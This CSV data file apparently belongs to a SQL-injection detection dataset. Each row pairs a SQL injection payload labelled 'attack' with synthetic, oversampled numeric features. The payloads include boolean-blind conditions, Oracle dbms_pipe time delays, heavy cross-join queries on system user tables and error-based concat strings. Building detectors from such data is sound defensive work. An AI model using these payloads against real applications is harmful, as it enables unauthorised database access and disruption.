id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000183,attack,boolean,"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- tzry",nearest_attack_euclidean,R000202,0.5677821650364699,250.59392097616842,33.10375683904674,3.7811007575788693,53.72629787332717,71.0,96.34883890760759,29.518784195233692,0.21433953770601752,0.28357012304578816,0.38436561438542305,0.11772472486277133,0.0,0.4150273561869522,1.792486321906524,0.0,1.9999999999999998,1.103756839046738,0.0,18.207513678093477,1.3877787807814457e-17,0.0,6.0,4.8962431609532615,0.0,0.10375683904673802,0.8962431609532617,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.000000000000001,0.0,0.0,1.0000000000000002,1.103756839046738,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.1037568390467385
SMOTE_000184,attack,boolean,"1' in boolean mode  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000119,0.5754796495802763,137.48525804109448,34.24798973287652,3.920912437267514,45.74128884246491,16.0,51.24530937671188,24.49865982191768,0.3313429266866355,0.11698756697350104,0.37301974020064677,0.17864976613921668,0.7493299109588397,0.0,2.0,0.0,0.0,1.0,0.0,10.749329910958838,1.3877787807814457e-17,2.0,1.0,9.0,0.7493299109588398,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000185,attack,boolean,"-5417 or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R000083,0.625822910258352,42.117688750144865,19.117688750144865,3.54135082270979,6.694151000115891,16.0,14.0,5.423537750028973,0.15676533125217298,0.3811760999987123,0.3335290874988733,0.12852948125024144,0.0,0.0,1.0,0.0,0.0,1.0,0.0,2.0,1.3877787807814457e-17,0.42353775002897287,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000186,attack,boolean,"1%"" and 2805  =  1345",nearest_attack_euclidean,R000222,0.513607678386423,21.528801908724724,13.64746539418352,3.418485249689635,2.82373269709176,9.528801908724718,6.0,3.176267302908239,0.13236504149355718,0.44116195020773136,0.2794190248961343,0.1470539834025771,0.0,1.0,0.17626730290823933,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.176267302908239,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.8237326970917607,0.1762673029082394,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000187,attack,boolean," end and    (    (   ""rqay"" like ""rqay",nearest_attack_euclidean,R000045,0.37306555059757057,36.34946277464047,12.764208967805782,3.116280443829652,18.0,-1.7763568394002505e-15,13.58525380683469,4.764208967805782,0.49890464351143593,0.0,0.3701168956197888,0.13097846086877532,0.0,2.9999999999999996,0.0,0.0,0.0,0.0,0.0,1.7642089678057817,1.3877787807814457e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000188,attack,boolean,"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""mrsl""  =  ""mrsl",nearest_attack_euclidean,R000057,0.3455028484190151,311.7196753740194,37.97678466535422,3.937895723199197,117.4660473031469,34.255368681103654,116.67324470472782,43.32501468504102,0.3770615352959177,0.10984139727634476,0.37417401665805555,0.13892305076968206,0.0,3.9071386614168513,0.0,0.0,0.0,2.0,0.0,24.139292007874722,1.3877787807814457e-17,3.0,2.9303539960626384,8.32501468504102,0.0,0.9767846653542129,0.0,0.023215334645787178,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0000000000000002,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9767846653542128,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,4.883923326771064,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,10.860707992125278
SMOTE_000189,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""mpxd"" like ""mpxd",nearest_attack_euclidean,R000221,1.0758488982700352,116.52440523485504,29.169378359428336,4.247912254963374,76.52440523485504,4.830621640571662,20.508135078285015,14.661243281143324,0.6564499445577981,0.04157780241875636,0.17587289125565747,0.12609936176778797,0.0,2.9999999999999996,0.0,0.0,1.0,0.0,0.0,2.0,1.3877787807814457e-17,4.153108202858308,3.8306216405716618,1.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0000000000000002,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000190,attack,boolean,-4494 or 5291  =  4452,nearest_attack_euclidean,R000129,0.41802861054394475,20.854626827401056,9.647577485354173,2.8947114150501543,2.0,11.11894371338543,5.823788742677085,1.9118943713385423,0.10247851689493875,0.5169759584124582,0.2878565220933815,0.09268900259922136,0.0,0.0,0.9118943713385431,0.0,0.0,0.9118943713385431,0.0,0.0,1.3877787807814457e-17,0.0,0.0,1.911894371338543,0.0,0.0,0.0,0.0,0.0,0.9118943713385431,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000191,attack,boolean,"-7559"" or 8792  =  6905--",nearest_attack_euclidean,R000099,0.07553740671407115,25.0,12.765477646308135,3.3424366325025305,2.0,12.0,6.0,5.0,0.08000000000000002,0.48,0.24,0.2,0.0,1.0,3.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000192,attack,boolean,"-9553""  )   as geih where 6453  =  6453 or 8453  =  8159--",nearest_attack_euclidean,R000066,0.0177558402106971,58.12447948412092,21.0,3.702028339666798,13.0,20.0,18.106696700675073,7.0177827834458455,0.2237086914340658,0.3441672175908705,0.31139198353447683,0.1207321074405869,0.0,1.0,3.0,0.0,0.0,2.0,0.0,1.017782783445845,1.3877787807814457e-17,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000193,attack,boolean,-2820'   )    )    or 6679  =  8848--,nearest_attack_euclidean,R000187,0.3603916637851426,36.837206195191804,14.569767182932651,3.0750768831694755,2.0,12.0,15.697671829326508,7.139534365865301,0.055813958420330434,0.33488375052198277,0.41472864518085484,0.1945736458768319,1.0,0.0,3.0,0.0,0.0,1.0,0.0,2.1395343658653014,1.3877787807814457e-17,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000194,attack,boolean,"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  # zcyc",nearest_attack_euclidean,R000046,1.9536869623785202,184.85490793491545,29.309151322485906,3.577678008235449,115.92745396745772,12.0,42.61830264497181,14.309151322485906,0.62742024231579,0.06506565565061612,0.2303127118865245,0.07720139014706953,0.4363837741619687,0.0,0.8727675483239377,0.0,1.0,1.0,0.0,4.436383774161969,1.3877787807814457e-17,0.0,6.0,2.872767548323938,0.43638377416196894,0.0,0.43638377416196894,0.5636162258380312,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0000000000000002,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000195,attack,boolean," end and ""xlvn""  =  ""xlvn",nearest_attack_euclidean,R000244,1.5824720205088738,25.460401975434756,10.46040197543476,3.1184292466976284,15.841607901739035,-1.7763568394002505e-15,6.079196049130484,3.539598024565241,0.6209147229036758,0.0,0.23962628830802885,0.13945898878829538,0.0,2.9999999999999996,0.0,0.0,0.0,0.539598024565241,0.0,0.0,1.3877787807814457e-17,0.0,0.0,0.5395980245652408,0.0,1.0,0.0,0.0,0.0,0.539598024565241,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000196,attack,boolean,"1"" and   (  3020  =  3020  )  *6703 and ""itpt""  =  ""itpt",nearest_attack_euclidean,R000151,0.3809278065666972,59.94720472732787,17.835533136361338,3.3957024983901514,14.0,13.0,23.289337272773224,9.657867454554646,0.2376649852271004,0.2206889148537361,0.38063812337695163,0.1610079765422119,0.0,4.0,0.0,0.0,1.0,2.0,0.0,2.657867454554645,1.3877787807814457e-17,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000197,attack,boolean,-3243 or 2266  =  3583#,nearest_attack_euclidean,R000213,0.07456359414479373,23.032327437942193,12.064654875884385,3.2158355030276344,2.0,12.0,6.0,3.0323274379421923,0.08683939334078919,0.521036360044735,0.2605181800223675,0.1316060665921084,0.03232743794219206,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,2.0,0.03232743794219217,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000198,attack,boolean,1' and 1541  =  6868#,nearest_attack_euclidean,R000053,0.22297613777414094,21.000000000000007,12.778033452404385,3.3249397210197578,3.0,9.0,6.0,3.0,0.14285714285714285,0.42857142857142855,0.2857142857142857,0.14285714285714285,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000199,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and ""ihbe"" like ""ihbe",nearest_attack_euclidean,R000249,0.275267666402185,90.69736608467758,27.741028814332836,4.038191224992065,48.27302456350819,7.352572035832093,24.553827114002978,10.517942371334325,0.5279090725191411,0.08494206058990489,0.27068270722687354,0.11646615966408042,0.0,2.9999999999999996,0.0,0.0,1.0,0.0,0.0,4.129485592833581,1.3877787807814457e-17,0.8705144071664186,1.1294855928335814,1.0,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0000000000000002,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000200,attack,boolean,"1' in boolean mode  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  #",nearest_attack_euclidean,R000225,0.9686122732410938,207.80429725043024,35.549037081415364,3.8045435137802053,67.7451854070768,25.372592703538402,81.94133373273824,32.745185407076804,0.3267393266695646,0.12214424549319444,0.39412882169186164,0.15698760614537927,0.7254814592923197,0.0,0.0,0.0,0.0,1.0,0.0,18.372592703538402,1.3877787807814457e-17,1.2745185407076804,3.2745185407076804,8.09807416283072,0.7254814592923198,0.0,0.0,0.9999999999999999,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.549037081415361,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.549037081415362
